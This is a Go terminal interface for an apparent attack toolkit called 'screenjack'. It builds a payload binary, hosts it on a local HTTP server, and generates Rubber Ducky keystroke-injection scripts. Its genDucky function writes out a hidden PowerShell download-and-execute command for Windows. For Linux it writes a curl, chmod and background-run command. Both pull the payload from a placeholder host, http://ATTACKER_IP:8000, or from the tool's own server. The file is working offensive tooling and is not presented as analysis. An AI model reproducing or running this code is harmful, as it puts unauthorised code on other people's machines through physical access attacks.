package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/atotto/clipboard"
	"github.com/BurntSushi/toml"
	"github.com/charmbracelet/bubbles/textinput"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

const logo = `  ____                            _            _
 / ___|  ___ _ __ ___  ___ _ __  (_) __ _  ___| | _____ _ __
 \___ \ / __| '__/ _ \/ _ \ '_ \ | |/ _` + "`" + ` |/ __| |/ / _ \ '__|
  ___) | (__| | |  __/  __/ | | || | (_| | (__|   <  __/ |
 |____/ \___|_|  \___|\___|_| |_|/ |\__,_|\___|_|\_\___|_|
                               |__/                          `

const configPath = "../config.toml"

type Section int

const (
	SecBuild Section = iota
	SecAssets
	SecDucky
)

var (
	// Amber/rust oxide palette
	rust     = lipgloss.Color("#D97706")
	amber    = lipgloss.Color("#F59E0B")
	orange   = lipgloss.Color("#EA580C")
	emerald  = lipgloss.Color("#10B981")
	cyan     = lipgloss.Color("#06B6D4")
	rose     = lipgloss.Color("#F43F5E")
	stone100 = lipgloss.Color("#F5F5F4")
	stone400 = lipgloss.Color("#A8A29E")
	stone500 = lipgloss.Color("#78716C")

	logoStyle    = lipgloss.NewStyle().Foreground(amber).Bold(true)
	titleStyle   = lipgloss.NewStyle().Foreground(rust).Bold(true)
	labelStyle   = lipgloss.NewStyle().Foreground(stone400)
	valueStyle   = lipgloss.NewStyle().Foreground(stone100)
	cursorStyle        = lipgloss.NewStyle().Foreground(amber).Bold(true)                      // cursor position
	enabledStyle       = lipgloss.NewStyle().Foreground(cyan).Bold(true)                       // enabled/selected items
	cursorEnabledStyle = lipgloss.NewStyle().Foreground(cyan).Background(lipgloss.Color("#44403C")).Bold(true) // cursor on enabled
	mutedStyle   = lipgloss.NewStyle().Foreground(stone500)
	successStyle = lipgloss.NewStyle().Foreground(emerald)
	errorStyle   = lipgloss.NewStyle().Foreground(rose)
	warnStyle    = lipgloss.NewStyle().Foreground(orange)

	boxStyle = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(stone500).
			Padding(0, 1)

	activeBox = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(rust).
			Padding(0, 1)
)

// Config persisted to TOML
type Config struct {
	Build BuildConfig `toml:"build"`
	Ducky DuckyConfig `toml:"ducky"`
	Asset string      `toml:"selected_asset"`
}

type BuildConfig struct {
	Linux   bool `toml:"linux"`
	Windows bool `toml:"windows"`
}

type DuckyConfig struct {
	OS      string `toml:"os"`
	URL     string `toml:"url"`
	Payload string `toml:"payload"`
	Delay   int    `toml:"delay"`
}

type Target struct {
	name, target string
	selected     bool
}

type Model struct {
	w, h          int
	section       Section
	cursor        int
	targets       []Target
	assets        []string
	filteredIdx   []int // indices into assets matching filter
	assetFilter   string
	assetScroll   int
	selectedAsset string
	buildMsg      string
	buildLog      string
	showLog       bool
	duckyMsg      string
	duckyOS       string
	duckyField    int
	urlInput      textinput.Model
	payloadInput  textinput.Model
	editing       bool
	// Preview
	previewing bool
	preview    PreviewModel
	// Add asset
	addingAsset bool
	assetInput  textinput.Model
	assetMsg    string
	// HTTP server
	server      *Server
	serverIP    string
	showHttpLog bool
}

type buildDone struct{ ok bool; msg, log string }
type assetList struct{ f []string }
type tickMsg time.Time

func tickCmd() tea.Cmd {
	return tea.Tick(50*time.Millisecond, func(t time.Time) tea.Msg {
		return tickMsg(t)
	})
}

func loadConfig() Config {
	cfg := Config{
		Ducky: DuckyConfig{
			OS:      "windows",
			URL:     "http://ATTACKER_IP:8000",
			Payload: "screenjack.exe",
			Delay:   500,
		},
	}
	if _, err := toml.DecodeFile(configPath, &cfg); err != nil {
		// Use defaults
	}
	return cfg
}

func (m Model) saveConfig() {
	cfg := Config{
		Build: BuildConfig{
			Linux:   m.targets[0].selected,
			Windows: m.targets[1].selected,
		},
		Ducky: DuckyConfig{
			OS:      m.duckyOS,
			URL:     m.urlInput.Value(),
			Payload: m.payloadInput.Value(),
			Delay:   500,
		},
		Asset: m.selectedAsset,
	}

	f, err := os.Create(configPath)
	if err != nil {
		return
	}
	defer f.Close()
	toml.NewEncoder(f).Encode(cfg)
}

func newModel() Model {
	cfg := loadConfig()

	url := textinput.New()
	url.Placeholder = "http://ATTACKER_IP:8000"
	url.SetValue(cfg.Ducky.URL)
	url.CharLimit = 200
	url.Width = 40

	payload := textinput.New()
	payload.Placeholder = "screenjack.exe"
	payload.SetValue(cfg.Ducky.Payload)
	payload.CharLimit = 50
	payload.Width = 30

	assetIn := textinput.New()
	assetIn.Placeholder = "/path/to/image.gif"
	assetIn.CharLimit = 200
	assetIn.Width = 50

	return Model{
		assetInput: assetIn,
		targets: []Target{
			{"linux", "x86_64-unknown-linux-gnu", cfg.Build.Linux},
			{"win-gnu", "x86_64-pc-windows-gnu", cfg.Build.Windows},
		},
		duckyOS:       cfg.Ducky.OS,
		urlInput:      url,
		payloadInput:  payload,
		server:        NewServer(),
		serverIP:      GetLocalIP(),
		selectedAsset: cfg.Asset,
	}
}

func (m Model) Init() tea.Cmd { return scanAssets }

func scanAssets() tea.Msg {
	var f []string
	if entries, _ := os.ReadDir("../assets"); entries != nil {
		for _, e := range entries {
			ext := strings.ToLower(filepath.Ext(e.Name()))
			if ext == ".gif" || ext == ".png" || ext == ".jpg" {
				f = append(f, e.Name())
			}
		}
	}
	return assetList{f}
}

func build(t []Target) tea.Cmd {
	return func() tea.Msg {
		var out []string
		var logs strings.Builder
		ok := true
		for _, x := range t {
			if !x.selected {
				continue
			}
			logs.WriteString(fmt.Sprintf("=== %s ===\n", x.target))
			cmd := exec.Command("cargo", "build", "--release", "--target", x.target)
			cmd.Dir = "../payload"
			output, err := cmd.CombinedOutput()
			logs.Write(output)
			logs.WriteString("\n")
			if err != nil {
				ok = false
				out = append(out, x.name+":✗")
			} else {
				out = append(out, x.name+":✓")
			}
		}
		if len(out) == 0 {
			return buildDone{false, "nothing selected", ""}
		}
		// ponytail: dump to /tmp for debugging
		os.WriteFile("/tmp/screenjack-build.log", []byte(logs.String()), 0644)
		return buildDone{ok, strings.Join(out, " "), logs.String()}
	}
}

func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.w, m.h = msg.Width, msg.Height
	case assetList:
		m.assets = msg.f
		m.filterAssets()
	case buildDone:
		m.buildLog = msg.log
		if msg.ok {
			m.buildMsg = successStyle.Render(msg.msg)
		} else {
			m.buildMsg = errorStyle.Render(msg.msg)
		}
	case tickMsg:
		if m.previewing && m.preview.IsAnimated() {
			m.preview.Tick()
			return m, tickCmd()
		}
	case tea.KeyMsg:
		// Close preview on any key
		if m.previewing {
			if msg.String() == "q" || msg.String() == "esc" || msg.String() == "p" {
				m.previewing = false
			}
			return m, nil
		}
		// Close logs
		if m.showLog {
			switch msg.String() {
			case "q", "esc", "l":
				m.showLog = false
			case "c":
				clipboard.WriteAll(m.buildLog)
			}
			return m, nil
		}
		// Close HTTP logs
		if m.showHttpLog {
			switch msg.String() {
			case "q", "esc", "x":
				m.showHttpLog = false
			case "c":
				m.server.ClearLogs()
			}
			return m, nil
		}
		// Adding asset
		if m.addingAsset {
			return m.updateAddAsset(msg)
		}
		if m.editing {
			return m.updateEditing(msg)
		}
		return m.keys(msg)
	}
	return m, nil
}

func expandPath(path string) string {
	if strings.HasPrefix(path, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			return filepath.Join(home, path[2:])
		}
	}
	return path
}

func (m Model) updateAddAsset(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch msg.String() {
	case "esc":
		m.addingAsset = false
		m.assetInput.Blur()
		return m, nil
	case "enter":
		src := expandPath(m.assetInput.Value())
		if src == "" {
			m.addingAsset = false
			m.assetInput.Blur()
			return m, nil
		}
		// Copy file to assets
		if err := copyFile(src, "../assets/"+filepath.Base(src)); err != nil {
			m.assetMsg = errorStyle.Render(err.Error())
		} else {
			m.assetMsg = successStyle.Render("added " + filepath.Base(src))
			m.addingAsset = false
			m.assetInput.Blur()
			return m, scanAssets
		}
		return m, nil
	}
	var cmd tea.Cmd
	m.assetInput, cmd = m.assetInput.Update(msg)
	return m, cmd
}

func (m *Model) filterAssets() {
	m.filteredIdx = nil
	filter := strings.ToLower(m.assetFilter)
	for i, a := range m.assets {
		if filter == "" || strings.Contains(strings.ToLower(a), filter) {
			m.filteredIdx = append(m.filteredIdx, i)
		}
	}
	// Reset cursor if out of bounds
	if m.cursor >= len(m.filteredIdx) {
		m.cursor = max(0, len(m.filteredIdx)-1)
	}
	m.assetScroll = 0
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

func (m Model) updateEditing(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch msg.String() {
	case "enter", "esc":
		m.editing = false
		m.urlInput.Blur()
		m.payloadInput.Blur()
		m.saveConfig()
		return m, nil
	}

	var cmd tea.Cmd
	if m.duckyField == 1 {
		m.urlInput, cmd = m.urlInput.Update(msg)
	} else if m.duckyField == 2 {
		m.payloadInput, cmd = m.payloadInput.Update(msg)
	}
	return m, cmd
}

func (m Model) keys(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	k := msg.String()

	// Global keys
	switch k {
	case "q", "ctrl+c":
		m.saveConfig()
		m.server.Stop()
		return m, tea.Quit
	case "tab":
		m.section = (m.section + 1) % 3
		m.cursor = 0
		return m, nil
	case "shift+tab":
		m.section = (m.section + 2) % 3
		m.cursor = 0
		return m, nil
	case "b":
		m.buildMsg = warnStyle.Render("building...")
		return m, build(m.targets)
	case "g":
		m.genDucky()
		m.duckyMsg = successStyle.Render("✓ saved")
		return m, nil
	case "r":
		return m, scanAssets
	case "s", "ctrl+s":
		m.saveConfig()
		return m, nil
	case "l":
		if m.buildLog != "" {
			m.showLog = true
		}
		return m, nil
	case "h":
		if m.server.IsRunning() {
			m.server.Stop()
		} else {
			payloadPath, ok := PayloadExists(m.duckyOS)
			if !ok {
				m.buildMsg = errorStyle.Render("no payload built")
				return m, nil
			}
			assetPath := ""
			if m.selectedAsset != "" {
				assetPath = "../assets/" + m.selectedAsset
			}
			if err := m.server.Start(payloadPath, assetPath); err != nil {
				m.buildMsg = errorStyle.Render(err.Error())
			}
		}
		return m, nil
	case "x":
		if m.server.IsRunning() {
			m.showHttpLog = true
		} else {
			m.buildMsg = warnStyle.Render("start server first (h)")
		}
		return m, nil
	}

	// Section-specific
	switch m.section {
	case SecBuild:
		switch k {
		case "j", "down":
			m.cursor = min(m.cursor+1, len(m.targets)-1)
		case "k", "up":
			m.cursor = max(m.cursor-1, 0)
		case " ", "x", "enter":
			m.targets[m.cursor].selected = !m.targets[m.cursor].selected
			m.saveConfig()
		case "a":
			for i := range m.targets {
				m.targets[i].selected = true
			}
			m.saveConfig()
		}

	case SecAssets:
		maxVisible := 6
		switch k {
		case "j", "down":
			m.cursor = min(m.cursor+1, max(0, len(m.filteredIdx)-1))
			// Scroll down if needed
			if m.cursor >= m.assetScroll+maxVisible {
				m.assetScroll = m.cursor - maxVisible + 1
			}
		case "k", "up":
			m.cursor = max(m.cursor-1, 0)
			// Scroll up if needed
			if m.cursor < m.assetScroll {
				m.assetScroll = m.cursor
			}
		case " ", "x", "enter":
			if len(m.filteredIdx) > 0 && m.cursor < len(m.filteredIdx) {
				m.selectedAsset = m.assets[m.filteredIdx[m.cursor]]
				m.saveConfig()
			}
		case "backspace":
			if len(m.assetFilter) > 0 {
				m.assetFilter = m.assetFilter[:len(m.assetFilter)-1]
				m.filterAssets()
			}
		case "esc":
			m.assetFilter = ""
			m.filterAssets()
		case "c":
			if m.assetFilter == "" {
				m.selectedAsset = ""
				m.saveConfig()
			} else {
				m.assetFilter += "c"
				m.filterAssets()
			}
		case "o":
			if m.assetFilter == "" {
				exec.Command("xdg-open", "../assets").Start()
			} else {
				m.assetFilter += "o"
				m.filterAssets()
			}
		case "p":
			if m.assetFilter == "" {
				if len(m.filteredIdx) > 0 && m.cursor < len(m.filteredIdx) {
					m.preview = NewPreview(m.assets[m.filteredIdx[m.cursor]], 60, 20)
					m.previewing = true
					if m.preview.IsAnimated() {
						return m, tickCmd()
					}
				}
			} else {
				m.assetFilter += "p"
				m.filterAssets()
			}
		case "a":
			if m.assetFilter == "" {
				m.addingAsset = true
				m.assetInput.SetValue("")
				m.assetInput.Focus()
				m.assetMsg = ""
				return m, textinput.Blink
			} else {
				m.assetFilter += "a"
				m.filterAssets()
			}
		default:
			// Type to filter
			if len(k) == 1 && k[0] >= 32 && k[0] <= 126 {
				m.assetFilter += k
				m.filterAssets()
			}
		}

	case SecDucky:
		switch k {
		case "j", "down":
			m.duckyField = min(m.duckyField+1, 2)
		case "k", "up":
			m.duckyField = max(m.duckyField-1, 0)
		case "t", " ":
			if m.duckyField == 0 {
				if m.duckyOS == "windows" {
					m.duckyOS = "linux"
					if m.payloadInput.Value() == "screenjack.exe" {
						m.payloadInput.SetValue("screenjack")
					}
				} else {
					m.duckyOS = "windows"
					if m.payloadInput.Value() == "screenjack" {
						m.payloadInput.SetValue("screenjack.exe")
					}
				}
				m.saveConfig()
			}
		case "enter", "e":
			if m.duckyField == 1 {
				m.editing = true
				m.urlInput.Focus()
				return m, textinput.Blink
			} else if m.duckyField == 2 {
				m.editing = true
				m.payloadInput.Focus()
				return m, textinput.Blink
			}
		}
	}

	return m, nil
}

func (m Model) genDucky() {
	var b strings.Builder

	// Use server IP:port if running, otherwise use configured URL
	baseURL := m.urlInput.Value()
	if m.server.IsRunning() {
		baseURL = fmt.Sprintf("http://%s:%d", m.serverIP, m.server.Port())
	}
	url := strings.TrimSuffix(baseURL, "/") + "/" + m.payloadInput.Value()

	b.WriteString(fmt.Sprintf("REM screenjack payload - target: %s\n", m.duckyOS))
	b.WriteString(fmt.Sprintf("REM url: %s\n", url))
	b.WriteString("REM exit: Ctrl+Shift+Escape (hold 2s)\n")
	b.WriteString("DELAY 500\n\n")

	if m.duckyOS == "windows" {
		b.WriteString("REM Open hidden PowerShell\n")
		b.WriteString("GUI r\n")
		b.WriteString("DELAY 300\n")
		b.WriteString("STRING powershell -w hidden\n")
		b.WriteString("ENTER\n")
		b.WriteString("DELAY 500\n\n")
		b.WriteString("REM Download and execute\n")
		b.WriteString(fmt.Sprintf("STRING $u='%s';$p=\"$env:TEMP\\%s\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p\n",
			url, m.payloadInput.Value()))
		b.WriteString("ENTER\n")
	} else {
		b.WriteString("REM Open terminal\n")
		b.WriteString("CTRL-ALT t\n")
		b.WriteString("DELAY 500\n\n")
		b.WriteString("REM Download, chmod, execute in background\n")
		name := m.payloadInput.Value()
		b.WriteString(fmt.Sprintf("STRING curl -sO %s && chmod +x %s && ./%s &\n", url, name, name))
		b.WriteString("ENTER\n")
		b.WriteString("DELAY 300\n")
		b.WriteString("STRING exit\n")
		b.WriteString("ENTER\n")
	}

	os.MkdirAll("../ducky", 0755)
	os.WriteFile("../ducky/payload_"+m.duckyOS+".txt", []byte(b.String()), 0644)
}

func (m Model) View() string {
	if m.w < 60 || m.h < 20 {
		return "too small"
	}

	// Preview overlay
	if m.previewing {
		return m.renderPreview()
	}
	// Log overlay
	if m.showLog {
		return m.renderLog()
	}
	// HTTP log overlay
	if m.showHttpLog {
		return m.renderHttpLog()
	}

	maxW := min(90, m.w-4)
	colW := (maxW - 3) / 2

	// Header
	hdr := lipgloss.Place(maxW, 6, lipgloss.Center, lipgloss.Center, logoStyle.Render(logo))

	// Status line
	linuxOK, winOK := "—", "—"
	if _, err := os.Stat("../dist/screenjack-linux"); err == nil {
		linuxOK = successStyle.Render("●")
	}
	if _, err := os.Stat("../dist/screenjack.exe"); err == nil {
		winOK = successStyle.Render("●")
	}
	assetInfo := fmt.Sprintf("%d", len(m.assets))
	if m.selectedAsset != "" {
		assetInfo = successStyle.Render(m.selectedAsset)
	}
	serverInfo := "off"
	if m.server.IsRunning() {
		serverInfo = successStyle.Render(fmt.Sprintf("%s:%d", m.serverIP, m.server.Port()))
	}
	status := mutedStyle.Render(fmt.Sprintf("linux:%s  win:%s  asset:%s  http:%s", linuxOK, winOK, assetInfo, serverInfo))

	// Panels
	buildBox := m.renderBuild(colW)
	assetsBox := m.renderAssets(colW)
	duckyBox := m.renderDucky(maxW)

	topRow := lipgloss.JoinHorizontal(lipgloss.Top, buildBox, " ", assetsBox)

	content := lipgloss.JoinVertical(lipgloss.Center,
		hdr,
		status,
		"",
		topRow,
		"",
		duckyBox,
	)

	// Help
	var help string
	if m.editing || m.addingAsset {
		help = mutedStyle.Render("enter:confirm  esc:cancel")
	} else {
		row1 := "tab:section  j/k:nav  space:select  a:add  e:edit  p:preview"
		row2 := "o:open  b:build  h:http  x:reqs  l:logs  g:gen  q:quit"
		help = mutedStyle.Render(row1) + "\n" + mutedStyle.Render(row2)
	}

	full := lipgloss.JoinVertical(lipgloss.Center, content, "", help)

	return lipgloss.Place(m.w, m.h, lipgloss.Center, lipgloss.Center, full)
}

func (m Model) renderBuild(w int) string {
	title := titleStyle.Render("Build")
	if m.section == SecBuild {
		title = cursorStyle.Render("▸ Build")
	}

	var lines []string
	for i, t := range m.targets {
		mark := "○"
		style := labelStyle
		isCursor := m.section == SecBuild && i == m.cursor

		if t.selected && isCursor {
			mark = "▸"
			style = cursorEnabledStyle
		} else if t.selected {
			mark = enabledStyle.Render("●")
			style = enabledStyle
		} else if isCursor {
			mark = "▸"
			style = cursorStyle
		}
		lines = append(lines, style.Render(fmt.Sprintf("%s %s", mark, t.name)))
	}
	if m.buildMsg != "" {
		lines = append(lines, "", m.buildMsg)
	}

	box := boxStyle.Width(w)
	if m.section == SecBuild {
		box = activeBox.Width(w)
	}

	return title + "\n" + box.Render(strings.Join(lines, "\n"))
}

func (m Model) renderAssets(w int) string {
	title := titleStyle.Render("Assets")
	if m.section == SecAssets {
		title = cursorStyle.Render("▸ Assets")
	}

	maxVisible := 6
	var lines []string

	// Filter line
	if m.assetFilter != "" {
		lines = append(lines, warnStyle.Render("/")+valueStyle.Render(m.assetFilter)+mutedStyle.Render(" (esc:clear)"))
	}

	if len(m.assets) == 0 {
		lines = append(lines, mutedStyle.Render("empty — o:open folder, r:refresh"))
	} else if len(m.filteredIdx) == 0 {
		lines = append(lines, mutedStyle.Render("no matches"))
	} else {
		// Show scroll indicator
		if m.assetScroll > 0 {
			lines = append(lines, mutedStyle.Render("  ↑ more"))
		}

		endIdx := min(m.assetScroll+maxVisible, len(m.filteredIdx))
		for vi := m.assetScroll; vi < endIdx; vi++ {
			i := m.filteredIdx[vi]
			a := m.assets[i]
			prefix := "  "
			style := labelStyle
			isSelected := a == m.selectedAsset
			isCursor := m.section == SecAssets && vi == m.cursor

			if isSelected && isCursor {
				prefix = "▸ "
				style = cursorEnabledStyle
			} else if isSelected {
				prefix = enabledStyle.Render("● ")
				style = enabledStyle
			} else if isCursor {
				prefix = "▸ "
				style = cursorStyle
			}
			lines = append(lines, prefix+style.Render(a))
		}

		if endIdx < len(m.filteredIdx) {
			lines = append(lines, mutedStyle.Render("  ↓ more"))
		}
	}

	if m.selectedAsset != "" {
		lines = append(lines, "", mutedStyle.Render("selected: ")+valueStyle.Render(m.selectedAsset))
	}

	// Add asset input
	if m.addingAsset {
		lines = append(lines, "", labelStyle.Render("path: ")+m.assetInput.View())
	} else if m.assetMsg != "" {
		lines = append(lines, "", m.assetMsg)
	}

	box := boxStyle.Width(w)
	if m.section == SecAssets {
		box = activeBox.Width(w)
	}

	return title + "\n" + box.Render(strings.Join(lines, "\n"))
}

func (m Model) renderDucky(w int) string {
	title := titleStyle.Render("Ducky Script")
	if m.section == SecDucky {
		title = cursorStyle.Render("▸ Ducky Script")
	}

	osLine := labelStyle.Render("os:      ") + valueStyle.Render(m.duckyOS)
	if m.section == SecDucky && m.duckyField == 0 {
		osLine = cursorStyle.Render("os:      ") + valueStyle.Render(m.duckyOS) + mutedStyle.Render(" (space)")
	}

	urlLine := labelStyle.Render("url:     ") + valueStyle.Render(m.urlInput.Value())
	if m.section == SecDucky && m.duckyField == 1 {
		if m.editing {
			urlLine = cursorStyle.Render("url:     ") + m.urlInput.View()
		} else {
			urlLine = cursorStyle.Render("url:     ") + valueStyle.Render(m.urlInput.Value()) + mutedStyle.Render(" (e)")
		}
	}

	payloadLine := labelStyle.Render("payload: ") + valueStyle.Render(m.payloadInput.Value())
	if m.section == SecDucky && m.duckyField == 2 {
		if m.editing {
			payloadLine = cursorStyle.Render("payload: ") + m.payloadInput.View()
		} else {
			payloadLine = cursorStyle.Render("payload: ") + valueStyle.Render(m.payloadInput.Value()) + mutedStyle.Render(" (e)")
		}
	}

	content := strings.Join([]string{osLine, urlLine, payloadLine}, "\n")
	if m.duckyMsg != "" {
		content += "  " + m.duckyMsg
	}

	box := boxStyle.Width(w)
	if m.section == SecDucky {
		box = activeBox.Width(w)
	}

	return title + "\n" + box.Render(content)
}

func (m Model) renderPreview() string {
	title := titleStyle.Render("Preview: " + m.preview.path)
	content := m.preview.View()
	help := mutedStyle.Render("esc/p/q: close")

	box := activeBox.Render(content)

	full := lipgloss.JoinVertical(lipgloss.Center, title, "", box, "", help)

	return lipgloss.Place(m.w, m.h, lipgloss.Center, lipgloss.Center, full)
}

func (m Model) renderLog() string {
	title := titleStyle.Render("Build Log")
	help := mutedStyle.Render("c:copy  esc/l/q:close")

	// Truncate log if too long
	log := m.buildLog
	lines := strings.Split(log, "\n")
	maxLines := m.h - 10
	if len(lines) > maxLines {
		lines = lines[len(lines)-maxLines:]
		log = "...\n" + strings.Join(lines, "\n")
	}

	box := activeBox.Width(min(m.w-4, 100)).Render(log)

	full := lipgloss.JoinVertical(lipgloss.Center, title, "", box, "", help)

	return lipgloss.Place(m.w, m.h, lipgloss.Center, lipgloss.Center, full)
}

func (m Model) renderHttpLog() string {
	title := titleStyle.Render("HTTP Server Log")
	serverInfo := fmt.Sprintf("http://%s:%d", m.serverIP, m.server.Port())
	subtitle := mutedStyle.Render(serverInfo)
	help := mutedStyle.Render("c:clear  esc/x/q:close")

	logs := m.server.Logs()
	var lines []string
	if len(logs) == 0 {
		lines = append(lines, mutedStyle.Render("no requests yet"))
	} else {
		maxLines := m.h - 12
		start := 0
		if len(logs) > maxLines {
			start = len(logs) - maxLines
		}
		for _, l := range logs[start:] {
			ts := l.Time.Format("15:04:05")
			status := successStyle.Render(fmt.Sprintf("%d", l.Status))
			if l.Status >= 400 {
				status = errorStyle.Render(fmt.Sprintf("%d", l.Status))
			}
			line := fmt.Sprintf("%s %s %s %s %s",
				mutedStyle.Render(ts),
				labelStyle.Render(l.Method),
				valueStyle.Render(l.Path),
				status,
				mutedStyle.Render(l.IP))
			lines = append(lines, line)
		}
	}

	box := activeBox.Width(min(m.w-4, 80)).Render(strings.Join(lines, "\n"))

	full := lipgloss.JoinVertical(lipgloss.Center, title, subtitle, "", box, "", help)

	return lipgloss.Place(m.w, m.h, lipgloss.Center, lipgloss.Center, full)
}

func main() {
	p := tea.NewProgram(newModel(), tea.WithAltScreen())
	if _, err := p.Run(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
